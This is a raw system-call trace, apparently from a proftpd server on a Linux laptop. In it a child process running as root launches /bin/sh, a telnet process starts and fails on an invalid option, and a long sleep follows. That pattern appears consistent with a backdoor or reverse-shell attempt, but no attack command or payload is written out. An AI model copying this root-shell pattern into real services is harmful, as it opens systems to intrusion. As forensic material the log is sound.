+4652  [00d50cb1] access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+4652  [00d50b74] open("/lib/libncurses.so.5", O_RDONLY) = 7
+4652  [00d50bf4] read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\240\223\0\0004\0\0\0"..., 512) = 512
+4652  [00d50b3e] fstat64(7, {st_mode=S_IFREG|0644, st_size=223768, ...}) = 0
+4652  [00d50df3] mmap2(NULL, 227536, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0x110000
+4652  [00d50e74] mprotect(0x144000, 4096, PROT_NONE) = 0
+4652  [00d50df3] mmap2(0x145000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x34) = 0x145000
+4652  [00d50bad] close(7)               = 0
+4652  [00d50cb1] access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+4652  [00d50b74] open("/usr/lib/libstdc++.so.6", O_RDONLY) = 7
+4652  [00d50bf4] read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000r\4\0004\0\0\0"..., 512) = 512
+4652  [00d50b3e] fstat64(7, {st_mode=S_IFREG|0644, st_size=975012, ...}) = 0
+4652  [00d50df3] mmap2(NULL, 1000332, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xda0000
+4652  [00d50df3] mmap2(0xe89000, 20480, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0xe9) = 0xe89000
+4652  [00d50df3] mmap2(0xe8e000, 25484, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xe8e000
+4652  [00d50bad] close(7)               = 0
+4652  [00d50cb1] access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+4652  [00d50b74] open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY <unfinished ...>
+4656  [002d2422] execve("/bin/sh", ["sh"], [/* 17 vars */] <unfinished ...>
+4652  [00d50b74] <... open resumed> )   = 7
+4656  [00dd4850] <... execve resumed> ) = 0
+4652  [00d50bf4] read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0`4\0\0004\0\0\0"..., 512) = 512
+4652  [00d50b3e] fstat64(7,  <unfinished ...>
+4656  [00de8aad] brk(0 <unfinished ...>
+4652  [00d50b3e] <... fstat64 resumed> {st_mode=S_IFREG|0644, st_size=149392, ...}) = 0
+4656  [00de8aad] <... brk resumed> )    = 0x8514000
+4652  [00d50df3] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0 <unfinished ...>
+4656  [00de9cb1] access("/etc/ld.so.nohwcap", F_OK <unfinished ...>
+4652  [00d50df3] <... mmap2 resumed> )  = 0xb77d8000
+4656  [00de9cb1] <... access resumed> ) = -1 ENOENT (No such file or directory)
+4652  [00d50df3] mmap2(NULL, 151680, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0 <unfinished ...>
+4656  [00de9df3] mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0 <unfinished ...>
+4652  [00d50df3] <... mmap2 resumed> )  = 0x148000
+4656  [00de9df3] <... mmap2 resumed> )  = 0xb7809000
+4652  [00d50df3] mmap2(0x16c000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x23 <unfinished ...>
+4656  [00de9cb1] access("/etc/ld.so.preload", R_OK <unfinished ...>
+4652  [00d50df3] <... mmap2 resumed> )  = 0x16c000
+4656  [00de9cb1] <... access resumed> ) = -1 ENOENT (No such file or directory)
+4652  [00d50bad] close(7 <unfinished ...>
+4656  [00de9b74] open("/etc/ld.so.cache", O_RDONLY <unfinished ...>
+4652  [00d50bad] <... close resumed> )  = 0
+4656  [00de9b74] <... open resumed> )   = 7
+4652  [00d50cb1] access("/etc/ld.so.nohwcap", F_OK <unfinished ...>
+4656  [00de9b3e] fstat64(7,  <unfinished ...>
+4652  [00d50cb1] <... access resumed> ) = -1 ENOENT (No such file or directory)
+4656  [00de9b3e] <... fstat64 resumed> {st_mode=S_IFREG|0644, st_size=56298, ...}) = 0
+4652  [00d50b74] open("/lib/libgcc_s.so.1", O_RDONLY <unfinished ...>
+4656  [00de9df3] mmap2(NULL, 56298, PROT_READ, MAP_PRIVATE, 7, 0 <unfinished ...>
+4652  [00d50b74] <... open resumed> )   = 7
+4656  [00de9df3] <... mmap2 resumed> )  = 0xb77fb000
+4652  [00d50bf4] read(7,  <unfinished ...>
+4656  [00de9bad] close(7 <unfinished ...>
+4652  [00d50bf4] <... read resumed> "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p#\0\0004\0\0\0"..., 512) = 512
+4656  [00de9bad] <... close resumed> )  = 0
+4652  [00d50b3e] fstat64(7,  <unfinished ...>
+4656  [00de9cb1] access("/etc/ld.so.nohwcap", F_OK <unfinished ...>
+4652  [00d50b3e] <... fstat64 resumed> {st_mode=S_IFREG|0644, st_size=120368, ...}) = 0
+4656  [00de9cb1] <... access resumed> ) = -1 ENOENT (No such file or directory)
+4656  [00de9b74] open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 7
+4656  [00de9bf4] read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000m\1\0004\0\0\0"..., 512) = 512
+4656  [00de9b3e] fstat64(7, {st_mode=S_IFREG|0755, st_size=1405508, ...}) = 0
+4656  [00de9df3] mmap2(NULL, 1415592, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0x9d4000
+4656  [00de9e74] mprotect(0xb27000, 4096, PROT_NONE) = 0
+4656  [00de9df3] mmap2(0xb28000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x153) = 0xb28000
+4656  [00de9df3] mmap2(0xb2b000, 10664, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb2b000
+4656  [00de9bad] close(7)               = 0
+4656  [00de9df3] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77fa000
+4656  [00dd5cdf] set_thread_area({entry_number:-1 -> 6, base_addr:0xb77fa8d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+4656  [00de9e74] mprotect(0xb28000, 8192, PROT_READ) = 0
+4656  [00de9e74] mprotect(0x805c000, 4096, PROT_READ) = 0
+4656  [00de9e74] mprotect(0xdef000, 4096, PROT_READ) = 0
+4656  [00de9e31] munmap(0xb77fb000, 56298) = 0
+4656  [00c44422] getpid()               = 4656
+4656  [00c44422] rt_sigaction(SIGCHLD, {SIG_DFL, [CHLD], SA_RESTART}, {SIG_DFL, [], 0}, 8) = 0
+4656  [00c44422] geteuid32()            = 0
+4656  [00c44422] brk(0)                 = 0x8514000
+4656  [00c44422] brk(0x8535000)         = 0x8535000
+4656  [00c44422] getppid()              = 4653
+4656  [00c44422] stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+4656  [00c44422] stat64(".", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+4656  [00c44422] ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdaa418) = -1 EINVAL (Invalid argument)
+4656  [00c44422] rt_sigaction(SIGINT, NULL, {SIG_IGN, [], 0}, 8) = 0
+4656  [00c44422] rt_sigaction(SIGQUIT, NULL, {SIG_IGN, [], 0}, 8) = 0
+4656  [00c44422] rt_sigaction(SIGTERM, NULL, {SIG_DFL, [], 0}, 8) = 0
+4656  [00c44422] rt_sigaction(SIGTERM, {SIG_DFL, ~[RTMIN RT_1], 0}, NULL, 8) = 0
+4656  [00c44422] read(0,  <unfinished ...>
+4652  [00d50df3] mmap2(NULL, 123432, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0x877000
+4652  [00d50df3] mmap2(0x894000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x1c) = 0x894000
+4652  [00d50bad] close(7)               = 0
+4652  [00d50cb1] access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+4652  [00d50b74] open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 7
+4652  [00d50bf4] read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000m\1\0004\0\0\0"..., 512) = 512
+4652  [00d50b3e] fstat64(7, {st_mode=S_IFREG|0755, st_size=1405508, ...}) = 0
+4652  [00d50df3] mmap2(NULL, 1415592, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0x18e000
+4652  [00d50e74] mprotect(0x2e1000, 4096, PROT_NONE) = 0
+4652  [00d50df3] mmap2(0x2e2000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x153) = 0x2e2000
+4652  [00d50df3] mmap2(0x2e5000, 10664, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x2e5000
+4652  [00d50bad] close(7)               = 0
+4652  [00d50cb1] access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+4652  [00d50b74] open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 7
+4652  [00d50bf4] read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\n\0\0004\0\0\0"..., 512) = 512
+4652  [00d50b3e] fstat64(7, {st_mode=S_IFREG|0644, st_size=9736, ...}) = 0
+4652  [00d50df3] mmap2(NULL, 12408, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xcff000
+4652  [00d50df3] mmap2(0xd01000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x1) = 0xd01000
+4652  [00d50bad] close(7)               = 0
+4652  [00d50df3] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77d7000
+4652  [00d50df3] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77d6000
+4652  [00d3ccdf] set_thread_area({entry_number:-1 -> 6, base_addr:0xb77d66d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+4652  [00d50e74] mprotect(0xd01000, 4096, PROT_READ) = 0
+4652  [00d50e74] mprotect(0x2e2000, 8192, PROT_READ) = 0
+4652  [00d50e74] mprotect(0x894000, 4096, PROT_READ) = 0
+4652  [00d50e74] mprotect(0x16c000, 4096, PROT_READ) = 0
+4652  [00d50e74] mprotect(0xe89000, 16384, PROT_READ) = 0
+4652  [00d50e74] mprotect(0x145000, 8192, PROT_READ) = 0
+4652  [00d50e74] mprotect(0x805a000, 4096, PROT_READ) = 0
+4652  [00d50e74] mprotect(0xd56000, 4096, PROT_READ) = 0
+4652  [00d50e31] munmap(0xb77d9000, 56298) = 0
+4652  [0081c422] brk(0)                 = 0x9440000
+4652  [0081c422] brk(0x9465000)         = 0x9465000
+4652  [0081c422] uname({sys="Linux", node="xmenxk-laptop", ...}) = 0
+4652  [0081c422] getpid()               = 4652
+4652  [0081c422] open("/etc/resolv.conf", O_RDONLY) = 7
+4652  [0081c422] fstat64(7, {st_mode=S_IFREG|0644, st_size=105, ...}) = 0
+4652  [0081c422] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77e6000
+4652  [0081c422] read(7, "# Generated by NetworkManager\nna"..., 4096) = 105
+4652  [0081c422] read(7, "", 4096)      = 0
+4652  [0081c422] close(7)               = 0
+4652  [0081c422] munmap(0xb77e6000, 4096) = 0
+4652  [0081c422] uname({sys="Linux", node="xmenxk-laptop", ...}) = 0
+4652  [0081c422] stat64("/etc/resolv.conf", {st_mode=S_IFREG|0644, st_size=105, ...}) = 0
+4652  [0081c422] open("/etc/resolv.conf", O_RDONLY) = 7
+4652  [0081c422] fstat64(7, {st_mode=S_IFREG|0644, st_size=105, ...}) = 0
+4652  [0081c422] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77e6000
+4652  [0081c422] read(7, "# Generated by NetworkManager\nna"..., 4096) = 105
+4652  [0081c422] read(7, "", 4096)      = 0
+4652  [0081c422] close(7)               = 0
+4652  [0081c422] munmap(0xb77e6000, 4096) = 0
+4652  [0081c422] uname({sys="Linux", node="xmenxk-laptop", ...}) = 0
+4652  [0081c422] socket(PF_FILE, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 7
+4652  [0081c422] connect(7, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
+4652  [0081c422] close(7)               = 0
+4652  [0081c422] socket(PF_FILE, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 7
+4652  [0081c422] connect(7, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
+4652  [0081c422] close(7)               = 0
+4652  [0081c422] open("/etc/nsswitch.conf", O_RDONLY) = 7
+4652  [0081c422] fstat64(7, {st_mode=S_IFREG|0644, st_size=513, ...}) = 0
+4652  [0081c422] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77e6000
+4652  [0081c422] read(7, "# /etc/nsswitch.conf\n#\n# Example"..., 4096) = 513
+4652  [0081c422] read(7, "", 4096)      = 0
+4652  [0081c422] close(7)               = 0
+4652  [0081c422] munmap(0xb77e6000, 4096) = 0
+4652  [00d50b74] open("/etc/ld.so.cache", O_RDONLY) = 7
+4652  [00d50b3e] fstat64(7, {st_mode=S_IFREG|0644, st_size=56298, ...}) = 0
+4652  [00d50df3] mmap2(NULL, 56298, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb77d9000
+4652  [00d50bad] close(7)               = 0
+4652  [00d50cb1] access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+4652  [00d50b74] open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 7
+4652  [00d50bf4] read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \32\0\0004\0\0\0"..., 512) = 512
+4652  [00d50b3e] fstat64(7, {st_mode=S_IFREG|0644, st_size=42572, ...}) = 0
+4652  [00d50df3] mmap2(NULL, 45772, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0x5ac000
+4652  [00d50df3] mmap2(0x5b6000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x9) = 0x5b6000
+4652  [00d50bad] close(7)               = 0
+4652  [00d50e74] mprotect(0x5b6000, 4096, PROT_READ) = 0
+4652  [00d50e31] munmap(0xb77d9000, 56298) = 0
+4652  [0081c422] open("/etc/host.conf", O_RDONLY) = 7
+4652  [0081c422] fstat64(7, {st_mode=S_IFREG|0644, st_size=92, ...}) = 0
+4652  [0081c422] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77e6000
+4652  [0081c422] read(7, "# The \"order\" line is only used "..., 4096) = 92
+4652  [0081c422] read(7, "", 4096)      = 0
+4652  [0081c422] close(7)               = 0
+4652  [0081c422] munmap(0xb77e6000, 4096) = 0
+4652  [0081c422] open("/etc/hosts", O_RDONLY|O_CLOEXEC) = 7
+4652  [0081c422] fcntl64(7, F_GETFD)    = 0x1 (flags FD_CLOEXEC)
+4652  [0081c422] fstat64(7, {st_mode=S_IFREG|0644, st_size=259, ...}) = 0
+4652  [0081c422] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77e6000
+4652  [0081c422] read(7, "127.0.0.1\tlocalhost\n127.0.1.1\txm"..., 4096) = 259
+4652  [0081c422] read(7, "", 4096)      = 0
+4652  [0081c422] close(7)               = 0
+4652  [0081c422] munmap(0xb77e6000, 4096) = 0
+4652  [0081c422] rt_sigaction(SIGTSTP, {0x80536c0, [TSTP], SA_RESTART}, {SIG_DFL, [], 0}, 8) = 0
+4652  [0081c422] ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfebfc18) = -1 EINVAL (Invalid argument)
+4652  [0081c422] write(2, "telnet: invalid option -- 'z'\n", 30) = 30
+4652  [0081c422] write(2, "Usage: telnet [-4] [-6] [-8] [-E"..., 121) = 121
+4652  [0081c422] close(-1)              = -1 EBADF (Bad file descriptor)
+4652  [0081c422] exit_group(1)          = ?
+4656  [00c44422] <... read resumed> "", 8192) = 0
+4656  [00c44422] exit_group(0)          = ?
+4653  [002d2422] <... wait4 resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 4656
+4653  [002d2422] --- SIGCHLD (Child exited) @ 0 (0) ---
+4653  [002d2422] dup2(10, 2)            = 2
+4653  [002d2422] close(10)              = 0
+4653  [002d2422] exit_group(0)          = ?
+4651  [002d2422] rt_sigaction(SIGINT, {SIG_IGN, [INT], SA_RESTART}, {0x804f636, ~[KILL STOP RTMIN RT_1], 0}, 8) = 0
+4651  [002d2422] rt_sigaction(SIGQUIT, {SIG_IGN, [QUIT], SA_RESTART}, {SIG_DFL, ~[KILL STOP RTMIN RT_1], 0}, 8) = 0
+4651  [002d2422] close(0)               = 0
+4651  [002d2422] open("/dev/null", O_RDONLY) = 0
+4651  [002d2422] close(7)               = 0
+4651  [002d2422] dup2(8, 1)             = 1
+4651  [002d2422] close(8)               = 0
+4651  [002d2422] execve("/bin/sleep", ["sleep", "4562"], [/* 17 vars */]) = 0
+4651  [00b1faad] brk(0)                 = 0x9dae000
+4651  [00b20cb1] access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+4651  [00b20df3] mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7791000
+4651  [00b20cb1] access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+4651  [00b20b74] open("/etc/ld.so.cache", O_RDONLY) = 7
+4651  [00b20b3e] fstat64(7, {st_mode=S_IFREG|0644, st_size=56298, ...}) = 0
+4651  [00b20df3] mmap2(NULL, 56298, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb7783000
+4651  [00b20bad] close(7)               = 0
+4651  [00b20cb1] access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+4651  [00b20b74] open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 7
+4651  [00b20bf4] read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000m\1\0004\0\0\0"..., 512) = 512
+4651  [00b20b3e] fstat64(7, {st_mode=S_IFREG|0755, st_size=1405508, ...}) = 0
+4651  [00b20df3] mmap2(NULL, 1415592, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xe28000
+4651  [00b20e74] mprotect(0xf7b000, 4096, PROT_NONE) = 0
+4651  [00b20df3] mmap2(0xf7c000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x153) = 0xf7c000
+4651  [00b20df3] mmap2(0xf7f000, 10664, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf7f000
+4651  [00b20bad] close(7)               = 0
+4651  [00b20df3] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7782000
+4651  [00b0ccdf] set_thread_area({entry_number:-1 -> 6, base_addr:0xb77828d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+4651  [00b20e74] mprotect(0xf7c000, 8192, PROT_READ) = 0
+4651  [00b20e74] mprotect(0x804f000, 4096, PROT_READ) = 0
+4651  [00b20e74] mprotect(0xb26000, 4096, PROT_READ) = 0
+4651  [00b20e31] munmap(0xb7783000, 56298) = 0
+4651  [00bdf422] brk(0)                 = 0x9dae000
+4651  [00bdf422] brk(0x9dcf000)         = 0x9dcf000
+4651  [00bdf422] open("/usr/lib/locale/locale-archive", O_RDONLY|O_LARGEFILE) = -1 ENOENT (No such file or directory)
+4651  [00bdf422] open("/usr/share/locale/locale.alias", O_RDONLY) = 7
+4651  [00bdf422] fstat64(7, {st_mode=S_IFREG|0644, st_size=2570, ...}) = 0
+4651  [00bdf422] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7790000
+4651  [00bdf422] read(7, "# Locale name alias data base.\n#"..., 4096) = 2570
+4651  [00bdf422] read(7, "", 4096)      = 0
+4651  [00bdf422] close(7)               = 0
+4651  [00bdf422] munmap(0xb7790000, 4096) = 0
+4651  [00bdf422] open("/usr/lib/locale/en_US.utf8/LC_IDENTIFICATION", O_RDONLY) = 7
+4651  [00bdf422] fstat64(7, {st_mode=S_IFREG|0644, st_size=373, ...}) = 0
+4651  [00bdf422] mmap2(NULL, 373, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb7790000
+4651  [00bdf422] close(7)               = 0
+4651  [00bdf422] open("/usr/lib/gconv/gconv-modules.cache", O_RDONLY) = 7
+4651  [00bdf422] fstat64(7, {st_mode=S_IFREG|0644, st_size=26048, ...}) = 0
+4651  [00bdf422] mmap2(NULL, 26048, PROT_READ, MAP_SHARED, 7, 0) = 0xb7789000
+4651  [00bdf422] close(7)               = 0
+4651  [00bdf422] open("/usr/lib/locale/en_US.utf8/LC_MEASUREMENT", O_RDONLY) = 7
+4651  [00bdf422] fstat64(7, {st_mode=S_IFREG|0644, st_size=23, ...}) = 0
+4651  [00bdf422] mmap2(NULL, 23, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb7788000
+4651  [00bdf422] close(7)               = 0
+4651  [00bdf422] open("/usr/lib/locale/en_US.utf8/LC_TELEPHONE", O_RDONLY) = 7
+4651  [00bdf422] fstat64(7, {st_mode=S_IFREG|0644, st_size=59, ...}) = 0
+4651  [00bdf422] mmap2(NULL, 59, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb7787000
+4651  [00bdf422] close(7)               = 0
+4651  [00bdf422] open("/usr/lib/locale/en_US.utf8/LC_ADDRESS", O_RDONLY) = 7
+4651  [00bdf422] fstat64(7, {st_mode=S_IFREG|0644, st_size=155, ...}) = 0
+4651  [00bdf422] mmap2(NULL, 155, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb7786000
+4651  [00bdf422] close(7)               = 0
+4651  [00bdf422] open("/usr/lib/locale/en_US.utf8/LC_NAME", O_RDONLY) = 7
+4651  [00bdf422] fstat64(7, {st_mode=S_IFREG|0644, st_size=77, ...}) = 0
+4651  [00bdf422] mmap2(NULL, 77, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb7785000
+4651  [00bdf422] close(7)               = 0
+4651  [00bdf422] open("/usr/lib/locale/en_US.utf8/LC_PAPER", O_RDONLY) = 7
+4651  [00bdf422] fstat64(7, {st_mode=S_IFREG|0644, st_size=34, ...}) = 0
+4651  [00bdf422] mmap2(NULL, 34, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb7784000
+4651  [00bdf422] close(7)               = 0
+4651  [00bdf422] open("/usr/lib/locale/en_US.utf8/LC_MESSAGES", O_RDONLY) = 7
+4651  [00bdf422] fstat64(7, {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+4651  [00bdf422] close(7)               = 0
+4651  [00bdf422] open("/usr/lib/locale/en_US.utf8/LC_MESSAGES/SYS_LC_MESSAGES", O_RDONLY) = 7
+4651  [00bdf422] fstat64(7, {st_mode=S_IFREG|0644, st_size=57, ...}) = 0
+4651  [00bdf422] mmap2(NULL, 57, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb7783000
+4651  [00bdf422] close(7)               = 0
+4651  [00bdf422] open("/usr/lib/locale/en_US.utf8/LC_MONETARY", O_RDONLY) = 7
+4651  [00bdf422] fstat64(7, {st_mode=S_IFREG|0644, st_size=286, ...}) = 0
+4651  [00bdf422] mmap2(NULL, 286, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb7781000
+4651  [00bdf422] close(7)               = 0
+4651  [00bdf422] open("/usr/lib/locale/en_US.utf8/LC_COLLATE", O_RDONLY) = 7
+4651  [00bdf422] fstat64(7, {st_mode=S_IFREG|0644, st_size=1170770, ...}) = 0
+4651  [00bdf422] mmap2(NULL, 1170770, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb7663000
+4651  [00bdf422] close(7)               = 0
+4651  [00bdf422] open("/usr/lib/locale/en_US.utf8/LC_TIME", O_RDONLY) = 7
+4651  [00bdf422] fstat64(7, {st_mode=S_IFREG|0644, st_size=2454, ...}) = 0
+4651  [00bdf422] mmap2(NULL, 2454, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb7662000
+4651  [00bdf422] close(7)               = 0
+4651  [00bdf422] open("/usr/lib/locale/en_US.utf8/LC_NUMERIC", O_RDONLY) = 7
+4651  [00bdf422] fstat64(7, {st_mode=S_IFREG|0644, st_size=54, ...}) = 0
+4651  [00bdf422] mmap2(NULL, 54, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb7661000
+4651  [00bdf422] close(7)               = 0
+4651  [00bdf422] open("/usr/lib/locale/en_US.utf8/LC_CTYPE", O_RDONLY) = 7
+4651  [00bdf422] fstat64(7, {st_mode=S_IFREG|0644, st_size=256324, ...}) = 0
+4651  [00bdf422] mmap2(NULL, 256324, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb7622000
+4651  [00bdf422] close(7)               = 0
+4651  [00bdf422] nanosleep({4562, 0},  <unfinished ...>
+4449  [080eca48] <... select resumed> ) = 0 (Timeout)
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [TERM CHLD], NULL, 8) = 0
+4449  [080d2dce] waitpid(-1, NULL, WNOHANG) = -1 ECHILD (No child processes)
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [TERM CHLD], NULL, 8) = 0
+4449  [080eb6d1] lstat64("/etc/shutmsg", 0xbff527e0) = -1 ENOENT (No such file or directory)
+4449  [080eca48] select(1, [0], NULL, NULL, {30, 0}) = ? ERESTARTNOHAND (To be restarted)
+4449  [080eca48] --- SIGALRM (Alarm clock) @ 0 (0) ---
+4449  [080b5a7f] rt_sigaction(SIGALRM, {0x804d520, [], SA_INTERRUPT}, NULL, 8) = 0
+4449  [080b5a7f] rt_sigaction(SIGALRM, NULL, {0x804d520, [], SA_INTERRUPT}, 8) = 0
+4449  [080b5a7f] rt_sigaction(SIGALRM, {0x804d520, [], SA_INTERRUPT}, NULL, 8) = 0
+4449  [080cbba0] time(NULL)             = 1407444954
+4449  [080d2e1d] alarm(30)              = 0
+4449  [00d78408] sigreturn()            = ? (mask now [])
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080eca48] select(0, NULL, NULL, NULL, {0, 200000}) = 0 (Timeout)
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080d2e1d] alarm(0)               = 30
+4449  [080cbba0] time(NULL)             = 1407444954
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ec87e] setresuid32(-1, 0, -1) = 0
+4449  [080ec90e] setresgid32(-1, 0, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080eb965] open("/usr/local/var/proftpd.scoreboard", O_RDWR|O_LARGEFILE) = 2
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080d314a] geteuid32()            = 0
+4449  [080ec90e] setresgid32(-1, 65534, -1) = 0
+4449  [080ec87e] setresuid32(-1, 65534, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ebb56] fcntl64(2, F_SETLKW64, {type=F_WRLCK, whence=SEEK_SET, start=0, len=0}, 0xbff529a0) = 0
